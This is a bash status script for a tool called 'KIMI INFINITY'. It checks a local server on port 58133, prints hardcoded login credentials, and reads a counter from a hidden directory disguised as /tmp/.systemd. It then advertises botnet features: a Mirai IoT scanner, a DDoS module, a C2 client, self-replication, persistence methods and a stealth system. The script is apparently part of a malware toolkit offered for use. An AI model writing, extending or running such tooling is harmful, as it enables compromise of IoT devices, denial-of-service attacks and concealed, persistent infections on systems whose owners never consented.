#!/bin/bash
echo "═══════════════════════════════════════════════════"
echo "  KIMI INFINITY — STATUS"
echo "═══════════════════════════════════════════════════"

python3 -c "import socket; s=socket.socket(); s.settimeout(2); r=s.connect_ex(('127.0.0.1',58133)); s.close(); exit(r)" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "  [✓] Server: RUNNING on port 58133"
    echo "  [✓] Local: http://localhost:58133"
    echo "  [✓] Auth: finn / sovereign2026"
else
    echo "  [✗] Server: STOPPED"
fi

if [ -f /tmp/.systemd/.evolution.gen ]; then
    GEN=$(cat /tmp/.systemd/.evolution.gen)
    echo "  [✓] Evolution Generation: $GEN"
fi

echo ""
echo "  ─── Features ───"
echo "  • Self-Evolution Engine"
echo "  • Mirai IoT Scanner"
echo "  • DDoS Module"
echo "  • C2 Client"
echo "  • File Replication"
echo "  • 8+ Persistence Methods"
echo "  • 5-Fold Watchdog"
echo "  • Stealth System"
echo "═══════════════════════════════════════════════════"
